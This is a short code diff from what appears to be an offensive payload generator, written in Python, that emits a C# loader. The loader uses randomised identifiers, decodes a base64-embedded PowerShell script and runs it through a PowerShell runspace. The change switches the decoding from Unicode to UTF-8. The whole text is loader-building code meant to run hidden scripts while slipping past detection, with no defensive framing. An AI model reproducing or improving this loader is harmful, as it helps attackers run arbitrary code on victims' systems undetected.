@@ -44,8 +44,8 @@ using System.IO; using System.Diagnostics; using System.Reflection; using System
 public class {0} {{
     public static void Main() {{
         byte[] {1} = Convert.FromBase64String("{6}");
-	string {2} = Encoding.Unicode.GetString({1});
-	Runspace {3} = RunspaceFactory.CreateRunspace();
+        string {2} = Encoding.UTF8.GetString({1});
+        Runspace {3} = RunspaceFactory.CreateRunspace();
         {3}.Open();
         RunspaceInvoke {4} = new RunspaceInvoke({3});
         Pipeline {5} = {3}.CreatePipeline();
@@ -56,5 +56,5 @@ public class {0} {{
     }}
 }}'''
 
-    loaderFinal = mCsharpCode.format(randomString(), randomString(), randomString(), randomString(), randomString(), randomString(), b64encode(mpPsCode).encode("UTF-16LE"))
+    loaderFinal = mCsharpCode.format(randomString(), randomString(), randomString(), randomString(), randomString(), randomString(), b64encode(mpPsCode))
     return loaderFinal
